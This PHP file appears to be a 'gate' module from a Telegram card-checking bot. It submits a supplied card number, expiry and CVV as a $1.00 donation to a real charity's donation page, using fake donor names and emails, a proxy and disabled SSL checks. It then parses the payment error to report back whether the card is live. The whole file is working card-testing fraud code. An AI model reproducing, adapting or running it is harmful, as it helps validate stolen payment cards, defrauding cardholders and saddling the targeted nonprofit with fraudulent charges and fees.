<?php

use App\Models\Bot;
use App\Gate\{CurlX, Make, Responses as Res};
use App\Faker\{Name, Address, PhoneNumber, Internet};

$curl_default = [CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0];
$ccs = $ccs[0];
$cc  = $ccs['cc'];
$cece = implode('|', $cc);
$user['ida'] = Bot::SendMsg($user['chat_id'], "<b>Gate <u>".$gate['name']."</u> <i>started</i>♻️\nCard: <code>".implode('|', $cc)."</code>\nTime:</b> <i>".Make::Took()."'s</i>", $user['msg_id'])['result']['message_id'];
# ~ REQ 2 ~ #
$num    = [];
$num[0] = substr($cc[0],0,4);
$num[1] = substr($cc[0],4,4);
$num[2] = substr($cc[0],8,4);
$num[3] = substr($cc[0],12,4);
$num[4] = substr($cc[0],14,2);
$cc01 = substr(implode(' ', $num), 0, -3);

$type = array(3 => 'AmEx', 4 => 'Visa', 5 => 'MasterCard', 6 => 'Discover');

$tnum = substr($cc[0],0,1);
$headers1 = ['Host: engage.portasophia.org','Origin: https://engage.portasophia.org','Content-Type: application/x-www-form-urlencoded','User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.113 Safari/537.36','Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','Referer: https://engage.portasophia.org/donate','Accept-Encoding: gzip, deflate, br','Accept-Language: es-ES,es;q=0.9,en;q=0.8', 'Connection: keep-alive', 'Upgrade-Insecure-Requests: 1'];
$post1 = 'option=com_donations&task=process&format=html&processor=gateway&campaign_title=Donate+to+Porta+Sophia&campaign_id=1&id=1&description=Donate&tax_exempt=1&c41965bb54e6c329ea8cd8953f7f20e3=1&amountLevelCode=&intervalUnit=once&intervalUnit=once&onetime_other_amt=1.00&recurring_other_amt=&amount=1.00&dedication_toggle=on&dedication=In+honor&dedication_name='.Name::firstName().'+'.Name::lastName().'&dedication_firstname='.Name::firstName().'&dedication_lastname='.Name::lastName().'&dedication_email='.urlencode(Internet::freeEmail()).'&dedication_message=&firstname='.Name::firstName().'&lastname='.Name::lastName().'&email='.urlencode(Internet::freeEmail()).'&phone=15023851039&CREDITCARDTYPE='.$type[$tnum].'&first_name='.Name::firstName().'&last_name='.Name::lastName().'&card_num='.$cc[0].'&exp_month='.$cc[1].'&exp_year='.$cc[2].'&card_code='.$cc[3].'&address=1682+Crossley+Street&city=Fortville&state=IN&zip=46040&bill_country=US&transaction_amount_original=1.00';
$site1 = ['url' => 'https://engage.portasophia.org/donate', 'method' => 'POST', 'post' => $post1, 'headers' => $headers1, 'cookie' => null, 'proxy' => $proxy2];
$req1 = Make::Create(1, $site1, $gate, $user);
IsUnspam($req1, $user);

Bot::EditMsgTxt($user['chat_id'], $user['ida'], Make::Wait(3, $cece, $gate['name'], $lang['wait']));
$resp = CurlX::ParseString($req1->body, '<li>Payment Error: ', '</li>');
Res::SetParams($resp, null, null, null, $req1->body);
$res = Res::brch();
Bot::EditMsgTxt($user['chat_id'], $user['ida'], Make::Parse($lang['final'], $user, $cece, $res, $ccs['bin'], $gate['name']));